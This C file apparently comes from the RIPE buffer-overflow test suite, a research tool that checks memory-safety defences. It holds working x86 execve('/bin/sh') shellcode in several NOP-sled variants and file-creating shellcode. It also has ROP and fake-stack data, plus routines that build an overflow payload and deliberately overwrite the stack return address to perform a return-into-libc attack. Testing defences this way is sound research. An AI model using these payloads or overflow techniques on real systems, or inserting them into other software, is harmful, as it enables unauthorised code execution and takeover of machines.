#include "ripe_attack_generator.h"

/**
 * Shell code without NOP sled.
 * @author Aleph One
 */
static char shellcode_nonop[] = 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t size_shellcode_nonop = sizeof(shellcode_nonop) / sizeof(shellcode_nonop[0]) - 1;  // Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library

/**
 * Shell code with simple NOP sled
 * @author Pontus Viking
 * @author Aleph One
 */
static char shellcode_simplenop[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t size_shellcode_simplenop = sizeof(shellcode_simplenop) / sizeof(shellcode_simplenop[0]) - 1;  // Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library

/**
 * Shell code with polymorphic NOP sled
 * @author Pontus Viking
 * @author Aleph One
 */
static char shellcode_polynop[] =
"\x99\x96\x97\x93\x91\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97\x46\x4e\xf8"
"\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b\xf5\x45\x4c"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t  size_shellcode_polynop =
sizeof(shellcode_polynop) / sizeof(shellcode_polynop[0]) - 1;
/* Do not count for the null terminator since a null in the */
/* shellcode will terminate any lib string function */

/**
 * Shellcode with NOP sled that touches a file in the /tmp/rip-eval/ directory
 * @author Nick Nikiforakis
 * @email: nick.nikiforakis[put @ here]cs.kuleuven.be
 *
 */


static char createfile_shellcode[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xEB\x18\x5B\x31\xC0\x88\x43\x14\xB0\x08\x31\xC9\x66\xB9\xBC\x02\xCD\x80\x31\xC0\xB0\x01\x31\xDB"
"\xCD\x80\xE8\xE3\xFF\xFF\xFF/tmp/rip-eval/f_xxxx";


static size_t size_shellcode_createfile = sizeof(createfile_shellcode) / sizeof(createfile_shellcode[0]) - 1;

static char cf_ret_param[] = "/tmp/rip-eval/f_xxxx";
static char space_for_stack_growth[1024] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
static int fake_esp_jmpbuff[15] = {0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,
0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,
0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,&exit, &cf_ret_param,448}; //448 => 0700 mode

/* DATA SEGMENT TARGETS */
/* Data segment buffers to inject into                                     */
/* Two buffers declared to be able to chose buffer address without NUL     */
/* Largest buffer declared last since it'll be "after" in the data seg     */
static char data_buffer1[1] = "d";
static char data_buffer2[128] = "dummy";
/* Target: Pointer in data segment for indirect attack                     */
/* Declared after injection buffers to place it "after" in the data seg    */
static long *data_mem_ptr = 0x0;
/* Target: Function pointer in data segment                                */
/* Declared after injection buffers since it'll be "after" in the data seg */
static int (*data_func_ptr2)(const char *) = &dummy_function;
static int (*data_func_ptr1)(const char *) = &dummy_function;
 /* Target: Longjump buffer in data segment                                */
 /* Declared after injection buffers to place it "after" on the data seg   */
static jmp_buf data_jmp_buffer = {0, 0, 0, 0, 0, 0};

int fooz(char *a, int b);
static struct attackme data_struct = {"AAAAAAAAAAAA",&fooz};



//NN: Moved away of harm's way (aka overflowing buffers in the data segment)
static char loose_change1[128];      //NN Sandwich the control vars
static boolean output_error_msg = TRUE;
static ATTACK_FORM attack;
static char loose_change2[128];      //NN Sandwich the control vars

static int rop_sled[7] = {&gadget1 + 62,0xFFFFFFFF,&gadget2 + 62,&cf_ret_param,0xFFFFFFFF,&gadget3 + 62, &exit};

int fooz(char *a, int b){
  int zz,ff;

  zz =a ;
  ff = b;

  printf("Fooz was called");
  return 1;
}

/**********/
/* MAIN() */
/**********/
int main(int argc, char **argv) {
  int option_char;
  int i = 0;
  FILE *output_stream;
  jmp_buf stack_jmp_buffer_param;

  //NN: Add provisioning for when 00 are in the address of the jmp_buffer_param
  jmp_buf stack_jmp_buffer_param_array[512];

  for(i=0; i < 512; i++){
  if(!contains_terminating_char(stack_jmp_buffer_param_array[i]))
    break;
  }
  if (i == 512){
    printf("Error. Can't allocate appropriate stack_jmp_buffer\n");
     exit(1);
  }

// ./build/ripe_attack_generator -t direct -i returnintolibc -c ret  -l stack -f memcpy

  setenv("param_to_system", "/bin/sh", 1);
  setenv("param_to_creat", "/tmp/rip-eval/f_xxxx",1); //NN

  /* Check if attack form is possible */
  perform_attack(output_stream, &dummy_function, stack_jmp_buffer_param_array[i]);
}

//Data Segment Attack vectors where here
//but they were moved to the top of the file
//so that they won't overflow into control variables

//reliable ways to get the adresses of the return address and old base pointer
#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)

/********************/
/* PERFORM_ATTACK() */
/********************/
void perform_attack(FILE *output_stream,
        int (*stack_func_ptr_param)(const char *),
        jmp_buf stack_jmp_buffer_param) {

  /* STACK TARGETS */
  /* Target: Longjump buffer on stack                                       */
  /* Declared before injection buffers to place it "below" on the stack     */
  jmp_buf stack_jmp_buffer;
  /* Target: Function pointer on stack                                      */
  /* Declared before injection buffers to place it "below" on the stack     */
  int (*stack_func_ptr)(const char *);
  /* Target: Pointer on stack for indirect attack                           */
  /* Declared before injection buffers to place it "below" on the stack     */
  /* Declared adjacent to the injection buffers, at the top of the stack,   */
  /* so an indirect attack won't overflow the stack target code pointers    */
  /* when overflowing the indirect pointer                                  */
  long *stack_mem_ptr;
  /* Stack buffers to inject into                                           */
  /* Two buffers declared to be able to chose buffer address without NUL    */
  /* Largest buffer declared first since it'll be "below" on the stack      */
 // char stack_buffer1[128];
 // char stack_buffer2[1];

  char stack_buffer[1024];
  //JMP_BUF for indirect attacks
  jmp_buf stack_jmp_buffer_indirect[512];
  struct attackme stack_struct;
  stack_struct.func_ptr = fooz;

  /* HEAP TARGETS */
  /* Heap buffers to inject into                                            */
  /* Two buffers declared to be able to chose buffer that gets allocated    */
  /* first on the heap. The other buffer will be set as a target, i.e. a    */
  /* heap array of function pointers.                                       */
  char *heap_buffer1 = (char *)malloc(128 + sizeof(long));
  char *heap_buffer2 = (char *)malloc(128 + sizeof(long));
  char *heap_buffer3 = (char *)malloc(128 + sizeof(long));
  /* Target: Pointer on heap for indirect attack                            */
  /* Declared after injection buffers to place it "after" on the heap       */
  long *heap_mem_ptr;
  /* Target: Function pointer on heap                                       */
  /* This pointer is set by collecting a pointer value in the function      */
  /* pointer array.                                                         */
  int (**heap_func_ptr)(const char *) = 0;
  /* Target: Longjmp buffer on the heap                                     */
  /* Declared after injection buffers to place it "after" on the heap       */
  //jmp_buf heap_jmp_buffer;
   jmp_buf *heap_jmp_buffer; //NN Here it is just a pointer...

  struct attackme *heap_struct = (struct attackme*)malloc(sizeof(struct attackme));
  heap_struct->func_ptr = fooz;


  /* BSS TARGETS */
  /* Target: Pointer in BSS segment for indirect attack                     */
  /* Declared after injection buffers to place it "after" in the BSS seg    */
  static long bss_dummy_value;
  /* Target: Function pointer in BSS segment                                */
  /* Declared after injection buffers to place it "after" in the BSS seg    */
  static int (*bss_func_ptr)(const char *);
  /* Target: Longjmp buffer in BSS segment                                  */
  /* Declared after injection buffers to place it "after" in the BSS seg    */
  static jmp_buf bss_jmp_buffer;
  static long *bss_mem_ptr;
  static char placeholder[128]; //NN provide enough space for shellcode
  /* BSS buffers to inject into                                             */
  /* Two buffers declared to be able to chose buffer address without NUL    */
  /* Largest buffer declared last since it'll be "after" in the BSS seg     */
  static char bss_buffer1[1];
  static char bss_buffer2[128];
  static jmp_buf bss_jmp_buffer_indirect;

  static struct attackme bss_struct;

  /* Pointer to buffer to overflow */
  char *buffer, *dump_start_addr;
  /* Address to target for direct (part of) overflow */
  void *target_addr;
  /* Buffer for storing a generated format string */
  char format_string_buf[16];
  /* Temporary storage of payload for overflow with fscanf() */
  FILE *fscanf_temp_file;
  CHARPAYLOAD payload;

  /* Storage of debug memory dumps (used for debug output) */
  MEM_DUMP mem_dump1[DEFAULT_DUMP_SIZE];
  MEM_DUMP mem_dump2[DEFAULT_DUMP_SIZE];
  MEM_DUMP payload_dump[DEFAULT_DUMP_SIZE];

  /* Check that malloc went fine */
  if(heap_buffer1 == NULL || heap_buffer2 == NULL) {
    perror("Unable to allocate heap memory.");
    exit(1);
  }

  /* Initialize function pointers to point to dummy function so    */
  /* that if the attack fails there will still be code to execute  */
  stack_func_ptr = &dummy_function;
  //  heap_func_ptr = &dummy_function;
  bss_func_ptr = &dummy_function;

  /***************************************/
  /* Set location for buffer to overflow */
  /***************************************/
  /* Injection into stack buffer                           */
  /* Make sure that we start injecting the shellcode on an */
  /* address not containing any terminating characters     */

  /* NN: Trying addresses until correct */
  buffer = stack_buffer;
  while (contains_terminating_char((unsigned long)buffer)){
    buffer += rand() % 10;
    printf("Trying %p\n",buffer);
  }
  /* Out of Bounds */
  if (buffer > stack_buffer + sizeof(stack_buffer) - 100){
    printf("Error. Couldn't find appropriate buffer on the stack\n");
    exit(1);
  }

  // Also set the location of the function pointer and the
  // longjmp buffer on the heap (the same since only choose one)
  heap_func_ptr = (void *)heap_buffer1;
  heap_jmp_buffer = (void *)heap_buffer1;

  //make sure we actually have an initialized function pointer on the heap
  if (heap_func_ptr)
    *heap_func_ptr = fooz;

  /************************************/
  /* Set target address for overflow, */
  /* (used to calculate payload size) */
  /************************************/
  target_addr = RET_ADDR_PTR;

  /*********************/
  /* Configure payload */
  /*********************/

  payload.ptr_to_correct_return_addr = RET_ADDR_PTR;

  /* Here payload.overflow_ptr will point to the attack code since */
  /* a direct attack overflows the pointer target directly         */
  payload.overflow_ptr = &creat; //NN42 

  /* Calculate payload size for overflow of chosen target address */
  if ((unsigned long)target_addr > (unsigned long)buffer) {
    payload.size =
      (unsigned int)((unsigned long)target_addr + sizeof(long)
         - (unsigned long)buffer
         + 1); /* For null termination so that buffer can be     */
               /* used with string functions in standard library */
     printf("target_addr == %p\n", target_addr);
     printf("buffer == %p\n", buffer);
     printf("psize == %d\n",payload.size);
     printf("stack_buffer == %p\n", stack_buffer);

  } else {
    if(output_error_msg) {
      printf(
        "Error: Target address is lower than address of overflow buffer.\n");
      printf(
        " Overflow direction is towards higher addresses.\n");
      printf("target_addr == %p\n", target_addr);
      printf("heap_func_ptr == %p\n", heap_func_ptr);
      printf("buffer == %p\n", buffer);
      printf("payload.size == %d\n", payload.size);
    }
    exit(1); 
  }
  /* Set first byte of buffer to null to allow concatenation functions to */
  /* start filling the buffer from that first byte                        */
  buffer[0] = '\0';

  /*****************/
  /* Build payload */
  /*****************/

  if(!build_payload(&payload)) {
    if(output_error_msg) {
      printf("Error: Could not build payload\n");
    }
    exit(1);
  }

  /****************************************/
  /* Overflow buffer with chosen function */
  /* Note: Here memory will be corrupted  */
  /****************************************/
  // memcpy() shouldn't copy the terminating NULL, therefore - 1
  memcpy(buffer, payload.buffer, payload.size - 1);
}


/*******************/
/* BUILD_PAYLOAD() */
/*******************/
boolean build_payload(CHARPAYLOAD *payload) {
  size_t size_shellcode, bytes_to_pad, i;
  char *shellcode, *temp_char_buffer, *temp_char_ptr;

  if(payload->size < sizeof(long)) {
    return FALSE;
  }
  size_shellcode = 0;
  shellcode = "dummy";
 
  //at this point, shellcode points to the correct shellcode and shellcode size points
  //to the correct size

  /* Allocate payload buffer */

  payload->buffer = (char *)malloc(payload->size);
  if(payload->buffer == NULL) {
    perror("Unable to allocate payload buffer.");
    return FALSE;
  }
  /* Copy shellcode into payload buffer */
  memcpy(payload->buffer, shellcode, size_shellcode);

  /* Calculate number of bytes to pad with */
  /* size - shellcode - target address - null terminator */
  bytes_to_pad =
    (payload->size - size_shellcode - sizeof(long) - sizeof(char));

  /* Pad payload buffer with dummy bytes */
  memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);

  //NN
  printf("\noverflow_ptr: %p\n",payload->overflow_ptr);

  /* ************************************ */
  /* Special case: Build fake stack frame */
  /* ************************************ */

  /* Extend the payload to cover two memory addresses beyond the  */
  /* return address and inject a pointer to environment variable  */
  /* containing a "/bin/sh" parameter for return-into-libc attacks*/

  // Extend payload size
  payload->size += (3 * sizeof(long));
  // Allocate new payload buffer
  temp_char_buffer = (char *)malloc(payload->size);
  // Copy current payload to new payload buffer
  memcpy(temp_char_buffer, payload->buffer, payload->size);
  // Copy existing return address to new payload
  memcpy(temp_char_buffer + payload->size - 1 - sizeof(long),
   (payload->ptr_to_correct_return_addr),
   sizeof(long));
  // Free the old payload buffer
  free(payload->buffer);
  // Set the new payload buffer
  payload->buffer = temp_char_buffer;
  
  /* Insert pointer to environment variable containing a          */
  /* "/bin/sh" parameter for return-into-libc attacks             */
  temp_char_ptr = getenv("param_to_creat"); // NN42
  memcpy(&(payload->buffer[payload->size -
         5 -               // NULL terminator
         sizeof(long)]),   // the injected parameter
   &temp_char_ptr,
   sizeof(long));

  
  //NN42: Inserting the permissions
  memcpy(&(payload->buffer[payload->size - 1 -
         sizeof(long)]),   // the injected parameter
   &fake_esp_jmpbuff[14],
   sizeof(long));
   
  /* Add the address to the direct or indirect target */

  memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
   &payload->overflow_ptr,
   sizeof(long));

  /* Finally, add the terminating null character at the end */
  memset((payload->buffer + payload->size - 1), '\0', 1);

  return TRUE;
}

boolean contains_terminating_char(unsigned long value) {
  size_t i;
  char temp;

  for(i = 0; i < sizeof(long); i++) {
    temp = (char)(value & (unsigned char)-1);
    if(temp == '\0' ||      /* NUL */
       temp == '\r' ||      /* Carriage return */
       temp == '\n' )      /* New line (or Line feed) */
       //temp == (char)0xff)  /* -1 */
      {
  return TRUE;
      }
    // CHAR_BIT declared in limits.h
    value >>= CHAR_BIT;
  }
  return FALSE;
}
